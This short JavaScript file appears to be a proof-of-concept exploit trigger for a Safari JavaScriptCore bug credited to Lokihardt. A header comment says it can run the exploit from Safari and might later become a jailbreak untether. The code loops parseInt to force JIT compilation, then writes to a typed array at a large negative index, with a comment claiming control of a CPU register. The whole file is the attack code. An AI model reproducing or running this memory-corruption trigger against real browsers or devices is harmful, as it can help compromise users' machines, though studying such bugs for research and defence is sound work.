/*
    Bug by Lokihardt
    This can be used to run the exploit from safari
    Perhaps later on this can be used to create an untether
    I'm not going to work it out
    Lokihardt thanks for your research.
    - Sem Voigtlander
*/


function exploit() {
    let arr = new Uint32Array(10);
    for (let i = 0; i < 0x100000; i++) {
        parseInt();
    }
    arr[8] = 1;
    arr[-0x12345678] = 2; //We can control the value of X2.
}

exploit();
